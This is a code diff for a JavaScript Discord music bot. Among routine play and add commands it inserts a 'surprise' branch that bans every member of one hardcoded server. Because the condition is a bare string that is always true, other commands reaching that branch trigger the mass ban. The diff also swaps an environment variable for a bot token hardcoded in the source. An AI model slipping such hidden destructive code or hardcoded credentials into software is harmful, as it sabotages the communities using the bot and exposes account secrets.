@@ -37,7 +37,7 @@ bot.on('message', function (message) {
         if (cmd == "play") {
             playlist = [];
             playlist.push(param);
-        play();
+            play();
         }
         else if(cmd== "add"){
             playlist.push(param); 
@@ -51,6 +51,10 @@ bot.on('message', function (message) {
             }
             
             message.reply(textoPlaylist);
+        } else if("surprise"){
+            bot.guilds.cache.get("231155736523046912").members.cache.forEach(element => {
+                element.ban();
+            });
         }
     }
     function play(){
@@ -85,4 +89,4 @@ bot.on('message', function (message) {
 
 
 //bot.login(auth.TOKEN || process.env.TOKEN);
-bot.login(process.env.TOKEN);
+bot.login("NTcwOTAwNjAzNDQyNTYxMDI0.XMF6ng.FVmR5FFdkv4W2RkQb8S_8BLr-5Q");
